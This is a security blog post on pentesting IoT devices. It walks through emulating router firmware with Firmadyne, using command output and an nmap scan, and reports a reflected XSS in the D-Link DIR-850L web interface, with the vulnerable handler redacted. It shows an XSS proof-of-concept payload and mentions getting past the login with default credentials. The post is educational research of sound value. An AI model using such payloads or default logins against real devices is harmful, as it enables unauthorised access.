=== Content from blog.mindedsecurity.com_7ac28472_20250126_124716.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

## Tuesday, October 2, 2018

# Pentesting IoT devices (Part 2: Dynamic Analysis)

###

This is the second part of our Pentesting IoT devices guide. In the [previous post](https://blog.mindedsecurity.com/2018/09/a-practical-guide-to-testing-security.html) it was provided an overview on firmware static analysis showing how it can help to find many security issues. In this article it will be discussed the so called dynamic approach for device pentesting. It will be described how it is possible, thanks to firmware emulation, to improve pentesters' skills and test devices without physically have them.

###

### Dynamic Analysis

The dynamic test of a device, from a security perspective, includes different activities and for each of them there is a specific testing methodology. For example, after a preliminary recon phase against a device, it is possible to face different services like a web server, an FTP service and even an unknown open port related to a customized communication protocol. In this case it is important to split test scenarios and apply a different methodology for each class of services. A great approach could be to test the web interface looking for the typical web vulnerabilities, then focusing on the FTP service and, in the end, studying the customized protocol by sniffing the device traffic or by fuzzing it.

The [OWASP IoT attack surface areas](https://www.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab=IoT_Attack_Surface_Areas) provides a useful checklist that helps pentesters in focusing and prioritizing their analysis.

Since it is not possible to describe all the dynamic analysis that a tester could perform against a device, this article focuses the attention on showing an effective way to emulate an IoT device.

### Firmware Emulation

The possibility to emulate a device starting from its firmware allows researchers to perform any kind of dynamic tests against it without having the physical device and without worrying about a possible brick. Actually, this kind of analysis are very effective in consultancy activities because sometimes it is necessary to work under particular circumstances, for example, when it is not allowed to test the real device because it's a production device or it is impossible to get the physical device because it is installed in an unreachable place but, in any case, a device firmware copy and a suitable emulator are provided. The main limitation of this technique is that **not all devices firmwares and architectures can be easily emulated**.

#### Firmadyne

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjp5grN0IDcF3qiIKq7reuhU9KTAZ086fAqRRwmcKse76mo97oXZDkTVND8rXDBTVPQHJcmLGCq2_w8LgkvUbpx1yEl7DlQUkeCXkFlOuBQ202HRLx-nw-xva8KANU8q7sjq7gc0DGGWzZr/s400/architecture.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjp5grN0IDcF3qiIKq7reuhU9KTAZ086fAqRRwmcKse76mo97oXZDkTVND8rXDBTVPQHJcmLGCq2_w8LgkvUbpx1yEl7DlQUkeCXkFlOuBQ202HRLx-nw-xva8KANU8q7sjq7gc0DGGWzZr/s1600/architecture.png)Firmadyne is a tool which allows you to emulate, thanks to [QEMU](https://www.qemu.org/), a Linux-based firmware and perform basic dynamic analysis against it.

As sentenced from its own [github page](https://github.com/firmadyne/firmadyne):*“FIRMADYNE is an automated and scalable system for performing emulation and dynamic analysis of Linux-based embedded firmware.”*

The aim of this software is to provide an automated way of testing a large number of firmwares with some test cases like *nmap* service discovery, *snmpwalk* or *metasploit.*

Currently it supports the emulation of three different CPUs architectures combinations:

* little-endian ARM
* little-endian MIPS
* big-endian MIPS

Below a step-by-step usage example of Firmadyne with the NetGear WN604 Router [Firmware](http://www.downloads.netgear.com/files/GDC/WN604/WN604%20Firmware%20Version%202.0.1.zip) as test case is shown.

The first step consists in the firmware extraction that Firmadyne accomplishes with the *extractor.py* script. This operation creates a zipped version of the firmware filesystem inside the *images* folder.

$ *./sources/extractor/extractor.py -b netgear -sql 127.0.0.1 -np -nk "**WN604 Firmware Version 2.0.1.zip**" images*
>> Database Image ID: 20
>> MD5: f961fcc6d198940c2aaebb18b836f795
>> Tag: 20
>> Temp: /tmp/tmpZDScTD
>> Status: Kernel: True, Rootfs: False, Do\_Kernel: False,                 Do\_Rootfs: True
>>>> Zip archive data, at least v2.0 to extract, compressed size: 710, uncompressed size: 1351, name: ReleaseNotes\_WN604\_fw\_2.0.1.html
>> Recursing into archive ...
[. . .]
/tmp/tmpSVfpkn/\_WN604\_V2.0.1\_firmware.tar.extracted/rootfs.squashfs
 >> MD5: fb9c11e075a37a8a5c989743897e8735
 >> Tag: 20
 >> Temp: /tmp/tmpWfQ7yl
 >> Status: Kernel: True, Rootfs: False, Do\_Kernel: False,                 Do\_Rootfs: True
 >> Recursing into archive ...
 >>>> Squashfs filesystem, big endian, lzma signature, version 3.1, size: 2333384 bytes, 650 inodes, blocksize: 131072 bytes, created: 2010-03-26 11:55:15
 >>>> **Found Linux filesystem in /tmp/tmpWfQ7yl/\_rootfs.squashfs.extracted/squashfs-root!**

The second step is identifying the device architecture and store the result into the database (note that the number 20 is the image ID given by Firmadyne to this firmware).

$ *./scripts/getArch.sh ./images/20.tar.gz*
./bin/busybox: **mipseb**

The third step is loading the content of the filesystem into the database and then create a *QEMU* disk image with the *makeImage.sh* script.

$ *./scripts/tar2db.py -i 20 -f ./images/20.tar.gz*
$ *sudo ./scripts/makeImage.sh 20*
Querying database for architecture... Password for user firmadyne:
**mipseb**
----Running----
----Copying Filesystem Tarball----
----Creating QEMU Image----
Formatting '/home/lcomi/work/clients/minded/firmadyne//scratch//20//image.raw', fmt=raw size=1073741824
----Creating Partition Table----
Welcome to fdisk (util-linux 2.31.1).
Changes will remain in memory only, until you decide to write them.
[. . .]

Once the image is ready it is time to infer firmware network configuration.

$ sudo ./scripts/inferNetwork.sh 20
Querying database for architecture... Password for user firmadyne:
mipseb
Running firmware 20: terminating after 120 secs...
qemu-system-mips: -net nic,vlan=0: 'vlan' is deprecated. Please use 'netdev' instead.
Bad SWSTYLE=0x04
qemu-system-mips: terminating on signal 2 from pid 19371 (timeout)
Inferring network...
Interfaces: [(**'brtrunk', '192.168.0.100'**)]
Done!

**Note**: if *infernetwork.sh* cannot identify any interfaces for the aforementioned firmware, it may be necessary to fix Firmadyne script as described by [this issue](https://github.com/firmadyne/firmadyne/issues/89).

In the end it is possible to launch the firmware emulation with the *run.sh* script.

$ sudo ./scratch/20/run.sh
Creating TAP device tap20\_0...
Set 'tap20\_0' persistent and owned by uid 0
Bringing up TAP device...
Adding route to 192.168.0.100...
Starting firmware emulation... use Ctrl-a + x to exit
qemu-system-mips: -net nic,vlan=0: 'vlan' is deprecated. Please use 'netdev' instead.
[    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:39:21 UTC 2016
[    0.000000]
[    0.000000] LINUX started...
[    0.000000] bootconsole [early0] enabled
[    0.000000] CPU revision is: 00019300 (MIPS 24Kc)
[    0.000000] FPU revision is: 00739300
[    0.000000] Determined physical RAM map:
[    0.000000]  memory: 00001000 @ 00000000 (reserved)
[    0.000000]  memory: 000ef000 @ 00001000 (ROM data)
[    0.000000]  memory: 0061e000 @ 000f0000 (reserved)
[    0.000000]  memory: 0f8f1000 @ 0070e000 (usable)
[    0.000000] debug: ignoring loglevel setting.
[. . .]

As can be seen from the nmap output and from the following picture, all the device services are available over the network at IP address 192.168.0.100 and they can be analyzed by using the scripts included in Firmadyne *analysis* folder.

$ nmap -p- -sV -T4 192.168.0.100
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-19 17:12 CEST

Nmap scan report for 192.168.0.100

Host is up (0.00070s latency).

Not shown: 65532 closed ports

PORT    STATE SERVICE VERSION

**22/tcp  open  ssh     Dropbear sshd 0.51 (protocol 2.0)**

**80/tcp  open  http    lighttpd 1.4.18**

**443/tcp open  ssl     OpenSSL (SSLv3)**

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

|  |
| --- |
| | Device web interface is listening on port 80. | | --- | |

Being a pentester who wants to manually conduct his own dynamic analysis and without being interested in the "statistic" capabilities of Firmadyne, it would be useful to employ this tool only to extract and emulate a device firmware. Considering this approach, it was created a simple but effective script called *firmadyne-launcher*to **easily automate the emulation of a firmware**.

After having installed and configured Firmadyne, it is possible to clone *firmadyne-launcher* [repository](https://github.com/mindedsecurity/firmadyne-launcher) on your local machine and move *firmadyne\_laucher.sh* inside Firmadyne application folder. Now, providing a firmware file as argument, the script can be started.

lcomi@aquarius:~/firmadyne$ ./firmadyne\_launcher.sh firmware.zip

Extracting the firmware...

Getting the architecture...

Creating the image...

Creating TAP device tap7\_0...

Set 'tap7\_0' persistent and owned by uid 0

Bringing up TAP device...

Adding route to 192.168.0.100...

Starting firmware emulation... use Ctrl-a + x to exit

qemu-system-mips: -net nic,vlan=0: 'vlan' is deprecated. Please use 'netdev' instead.

[    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:39:21 UTC 2016

[    0.000000]

[    0.000000] LINUX started...

[    0.000000] bootconsole [early0] enabled

[    0.000000] CPU revision is: 00019300 (MIPS 24Kc)

[    0.000000] FPU revision is: 00739300

[    0.000000] Determined physical RAM map:

[    0.000000]  memory: 00001000 @ 00000000 (reserved)

[    0.000000]  memory: 000ef000 @ 00001000 (ROM data)

[ . . . ]

Welcome to SDK.

Have a lot of fun...

netgear123456 login:

### Looking for web vulnerabilities

To prove that it is possible to dynamically test an emulated device like a physical one, some interesting web vulnerabilities could be hunted. Below it is given an example about the findings of a new reflected XSS inside the web interface of the Dlink 850L router. The vulnerable firmware can be found [here](http://files.dlink.com.au/products/DIR-850L/REV_A/Firmware/Firmware_v1.14B07B01/DIR850LA1_FW114WWb07b01.bin).

|  |
| --- |
| Router login page, the default password is empty. |

After the login page, that can be simply bypassed using the default [credentials](https://www.lifewire.com/d-link-default-password-list-2619152), it is possible to see different menu and configuration options which a user can modify. After mapping some of them with the help of a proxy like Burp, it was noticed that a particular handler had a vulnerable parameter that led us to trigger an XSS through the following tampered GET request:
> http://192.168.0.1/[HANDLER]?[PARAM]=</script><script>alert(document.cookie)</script>

|  |
| --- |
| | Execution of the arbitrary JS code inside the victim's browser. | | --- | |

The details of this vulnerability, addressed as CVE-2018-17779, are actually redacted to allow Dlink to patch any vulnerable firmwares.

It is suggested to download the aforementioned D-Link firmware and try to find out many other vulnerabilities. Another great exercise is to manually extract the device filesystem (following [the first part](https://blog.mindedsecurity.com/2018/09/pentesting-iot-devices-part-1-static.html) of this guide) and localize any dynamic analysis findings (like the xss-vulnerable web page) inside the source code and then find a solution to fix them.

### Conclusions

In this article it was shown how it is possible to emulate a firmware device and what are its main advantages and limitations. Thanks to this technique, a new vulnerability inside Dlink DIR-850L web interface was found, even without having the physical device.

This post closes our IoT pentesting serie, where both static and dynamic approach in firmwares security review have been discussed. It is important to underline that IoT manufacturers have to consider the security of their products as a top priority and researchers should have the possibility to freely test devices to find out new vulnerabilities and responsibly disclose them.

### References

* https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf
* https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html

By

[Lorenzo Comi](https://www.blogger.com/profile/08777059741084155036 "author profile")

at

[7:31 AM](https://blog.mindedsecurity.com/2018/10/pentesting-iot-devices-part-2-dynamic.html "permanent link")

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=5158659719470791292&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5158659719470791292&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5158659719470791292&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5158659719470791292&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5158659719470791292&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5158659719470791292&target=pinterest "Share to Pinterest")

#### 2 comments :

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/02361382229892951093)[October 4, 2018 at 2:40 PM](https://blog.mindedsecurity.com/2018/10/pentesting-iot-devices-part-2-dynamic.html?showComment=1538689200195#c4174184130064862165)

   nice

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=7122745763234660283&postID=4174184130064862165)Replies
   Reply
2. ![](//resources.blogblog.com/img/blank.gif)Anonymous[November 6, 2019 at 2:29 AM](https://blog.mindedsecurity.com/2018/10/pentesting-iot-devices-part-2-dynamic.html?showComment=1573036199086#c8612593537868831794)

   Thanks for the article Lorenzo. Btw, I believe you linked the wrong 'part 1' in the beginning there (should probably be https://blog.mindedsecurity.com/2018/09/pentesting-iot-devices-part-1-static.html)

   Cheers

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=7122745763234660283&postID=8612593537868831794)Replies
   Reply

Add commentLoad more...

[Newer Post](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html "Newer Post")

[Older Post](https://blog.mindedsecurity.com/2018/09/a-practical-guide-to-testing-security_18.html "Older Post")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Post Comments
(
Atom
)](https://blog.mindedsecurity.com/feeds/5158659719470791292/comments/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
